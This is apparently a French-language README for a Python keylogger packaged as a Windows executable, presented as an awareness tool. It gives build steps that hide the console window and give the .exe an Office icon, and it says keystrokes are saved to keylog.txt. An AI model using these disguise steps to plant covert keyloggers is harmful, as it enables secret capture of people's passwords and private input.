# py-logger
Keylogger en Python et packagé en .exe  
⚠️ Disclamer : Créé et utilisé à des fins de sensibilisation UNIQUEMENT !!

# README
## Script Python
Création du **venv** :
```PowerShell
py.exe -m venv .venv
```

Se placer dans le **venv** :
```PowerShell
.venv\Scripts\activate
```

Installer les **requirements Python** :
```PowerShell
pip install -r requirements.txt
```

## Build l'exécutable

```PowerShell
pyinstaller --onefile --noconsole --icon=.\office.ico .\looger.py
```
> `--onefile` : Génère un seul fichier .exe au lieu d'un dossier avec plusieurs fichiers.  
> `--noconsole` : Masque la fenêtre de console.  
> `--icon` : Permet de custom l'icon.  
> Pour renomer l'exécutable, il faut renommer le fichier python `logger.py` en ce que vous voulez.

## Run l'exécutable
Lancer l'exécutable, les frappes de clavier seront stockées dans le fichier `keylog.txt`. Pour arrêter le KeyLogger, supprimer le processus dans le gestionnaire des tâches.